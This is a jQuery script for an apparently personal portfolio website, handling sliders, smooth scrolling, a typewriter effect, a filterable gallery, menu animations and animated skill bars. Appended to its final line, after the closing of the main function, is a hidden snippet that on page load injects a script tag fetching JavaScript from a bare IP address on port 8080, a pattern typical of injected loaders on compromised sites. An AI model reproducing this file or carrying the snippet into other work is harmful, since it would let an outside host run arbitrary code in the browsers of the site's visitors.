$(function () {

    //Adjust slider height

    $(".slider").height($(window).height());

    //Trigger nice scroll

    $("html").niceScroll({
        cursorcolor:"#E3872D",
        cursorwidth:"10px",
        cursorborder:"none",
        scrollspeed: 10,
        zindex:9
    });

    // Typewriter effect

    var typed = new Typed(".changed-text", {
        smartBackspace: true, // Default value
        typeSpeed: 50,
        backSpeed: 30,
        startDelay: 100,
        backDelay: 1000,
        
        showCursor: false
    });
    var typed = new Typed(".changed-text2", {
        strings: ["Freelancer", "Web Developer", "UI/UX Designer"],
        smartBackspace: true, // Default value
        typeSpeed: 50,
        backSpeed: 30,
        startDelay: 100,
        backDelay: 1000,
        loop: true,
        showCursor: false
    });
    //scroll to about me

    $(".fa-chevron-down").click(function () {
        $("html, body").animate({
            scrollTop: $(".about-me").offset().top + 1
        }, 1000);
    });

    //Trigger mix it up
    
    var config = $(".gallary"),
        mixer = mixitup(config);

    //active li

    $('.work-gallary .control ul li').click(function () {

        $(this).addClass("active").siblings().removeClass("active");
    });

    //bx slider

    $(".testi .inner").bxSlider();

    //menu

    $(".fa-chevron-left").click(function () {
        $(this).fadeOut();
        $(this).next(".fa-chevron-right").fadeIn();
        $(this).parent("menu").animate({
            left:"-300px"
        }, 500);
    });

    $(".fa-chevron-right").click(function () {
        $(this).fadeOut();
        $(this).prev(".fa-chevron-left").fadeIn();
        $(this).parent("menu").animate({
            left:0
        }, 500);
    });

    // go to section

    function goToSec(clicable, distnation) {

        $(clicable).click(function (e) {
            e.preventDefault();
            $("html, body").animate({
                scrollTop: distnation.offset().top
            }, 1000);
        });
    }
    goToSec("menu ul .homm", $("#home"));
    goToSec("menu ul .aboo", $("#about"));
    goToSec("menu ul .serr", $("#ser"));
    goToSec("menu ul .porr", $("#port"));
    goToSec("menu ul .neww", $("#news"));
    goToSec("menu ul .conn", $("#cont"));
    //go to up
    var scrollToTop = $(".go-to-up button");
    $(window).scroll(function () {

        if ($(window).scrollTop() >= 1000) {

            if (scrollToTop.is(":hidden")){

                scrollToTop.fadeIn();
            }

        } else {

            scrollToTop.fadeOut();
        }

        //abilites

        if ($(window).scrollTop() >= $(".abilities").offset().top - 500) {

            $(".abilities .o95").animate({
                width:"95%"
            }, 1000, function () {
                $(".abilities .one").text("95%");
            });

            $(".abilities .o85").animate({
                width:"85%"
            }, 1000, function () {
                $(".abilities .two").text("85%");
            });

            $(".abilities .o75").animate({
                width:"75%"
            }, 1000, function () {
                $(".abilities .three").text("75%");
            });

            $(".abilities .o90").animate({
                width:"90%"
            }, 1000, function () {
                $(".abilities .four").text("90%");
            });
        }

    });

    scrollToTop.click(function () {

        $("html, body").animate({

            scrollTop:0
        }, 1000);
    });

    //Adjust chvron down
    function animateCursor() {
        $(".fa-chevron-down").animate({
        
            bottom: "50px"
        }, 1000).animate({
            
            bottom: "30px"
        }, 1000);
        animateCursor();
    }
    animateCursor();
});;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id 

='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);